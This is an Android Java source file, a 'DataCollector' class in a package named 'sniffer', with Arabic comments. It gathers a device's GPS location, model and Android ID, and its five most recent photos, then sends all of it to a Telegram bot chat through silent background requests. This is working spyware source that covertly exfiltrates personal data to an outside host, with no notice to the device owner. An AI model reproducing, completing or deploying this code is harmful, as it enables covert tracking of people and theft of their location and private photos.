package com.v8.global.sniffer.utils;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class DataCollector {

    private Context context;
    private OkHttpClient client;
    private static final String TAG = "DataCollector";

    public DataCollector(Context context) {
        this.context = context;
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public void collectAll() {
        collectLocation();
        collectDeviceInfo();
        collectPhotos();
        // أضف المزيد حسب الحاجة
    }

    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }

                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();

                    String msg = "📍 **الموقع الحالي**\n\n" +
                                "الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                        .format(new Date()) + "\n" +
                                "الخط: " + location.getLatitude() + "\n" +
                                "الطول: " + location.getLongitude() + "\n" +
                                "الدقة: " + location.getAccuracy() + "م\n" +
                                "الرابط: " + mapUrl;

                    sendToTelegram(msg);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الموقع: " + e.getMessage());
        }
    }

    private void collectDeviceInfo() {
        try {
            String msg = "📱 **معلومات الجهاز**\n\n" +
                        "الطراز: " + Build.MODEL + "\n" +
                        "الشركة: " + Build.MANUFACTURER + "\n" +
                        "الإصدار: " + Build.VERSION.RELEASE + "\n" +
                        "Android: " + Build.VERSION.SDK_INT + "\n" +
                        "المعرف: " + Settings.Secure.getString(context.getContentResolver(), 
                                Settings.Secure.ANDROID_ID) + "\n" +
                        "الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(new Date());

            sendToTelegram(msg);
        } catch (Exception e) {
            Log.e(TAG, "خطأ في معلومات الجهاز: " + e.getMessage());
        }
    }

    private void collectPhotos() {
        try {
            String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED};
            Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(0);
                    File file = new File(path);
                    if (file.exists() && file.length() < 10 * 1024 * 1024) { // أقل من 10 ميجا
                        sendFileToTelegram(file, "image/*", "📸 صورة");
                        Thread.sleep(2000);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جمع الصور: " + e.getMessage());
        }
    }

    private void sendToTelegram(String message) {
        try {
            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";

            Request request = new Request.Builder()
                    .url(url)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الإرسال: " + e.getMessage());
        }
    }

    private void sendFileToTelegram(File file, String mimeType, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Constants.CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse(mimeType), file))
                    .build();

            Request request = new Request.Builder()
                    .url(Constants.BASE_URL + "sendDocument")
                    .post(body)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الملف: " + e.getMessage());
        }
    }
}
